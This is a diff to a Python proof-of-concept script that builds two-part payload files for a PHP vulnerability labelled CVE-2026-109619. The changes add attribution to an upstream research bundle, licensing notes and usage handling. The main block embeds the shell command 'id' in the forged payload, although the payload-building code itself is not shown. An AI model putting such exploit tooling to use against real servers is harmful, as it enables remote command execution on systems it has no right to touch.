@@ -1,6 +1,20 @@
 #!/usr/bin/env python3
 
-"""producer_619.py - CVE-2026-109619 producer shape (public poc1 spec re-write, inert forge default; build(sid,cmd,call)->(phase1,tail))."""
+"""producer_619.py - CVE-2026-109619 producer shape.
+
+Adapted from `poc1_109619.py` in the PHP-UP-2026 bundle by J4ck3LSyN, with
+PoCs by Andrew Dorman / @acd421; published at
+https://jackalsyn.com/posts/php-up-2026.html and mirrored at
+cereZ23/php-up-2026, commit c63f145596dbe9cdd437d24ed2418f0c1e59bcc2.
+
+That bundle states no open-source license and is marked "Authorized
+defensive-research / scoped-engagement use only." This file is an adaptation,
+not a relicensing: the repository's AGPL-3.0 does not apply to the upstream
+material and grants no rights the authors did not grant. See
+THIRD_PARTY_NOTICES.md.
+
+Inert forge default: build(sid, cmd, call) -> (phase1, tail).
+"""
 
 import struct
 import sys
@@ -9,6 +23,10 @@ FILL = 5120
 N149 = 149
 BLOB = 288
 BOUND = b"B7kQpoc619"
+USAGE = """usage: producer_619.py <sid> <out-prefix>
+
+Build the CVE-2026-109619 phase1/tail shapes and write <out-prefix>.phase1 and
+<out-prefix>.tail. Use --help to show this message."""
 
 
 def forge(call: int, cmd: bytes) -> bytes:
@@ -46,11 +64,18 @@ def build(sid: str, cmd: bytes, call: int):
 
 
 if __name__ == "__main__":
-    sid = sys.argv[1] if len(sys.argv) > 1 else "poc619-p"
+    argv = sys.argv[1:]
+    if any(arg in ("-h", "--help") for arg in argv):
+        print(USAGE)
+        raise SystemExit(0)
+    if len(argv) != 2:
+        print(USAGE, file=sys.stderr)
+        raise SystemExit(2)
+    sid, out_prefix = argv
     cmd = "id"
     p1, t = build(sid, cmd.encode(), 0)
     sys.stdout.write(f"phase1={len(p1)} tail={len(t)}\n")
-    with open(sys.argv[2] + ".phase1", "wb") as f:
+    with open(out_prefix + ".phase1", "wb") as f:
         f.write(p1)
-    with open(sys.argv[2] + ".tail", "wb") as f:
+    with open(out_prefix + ".tail", "wb") as f:
         f.write(t)
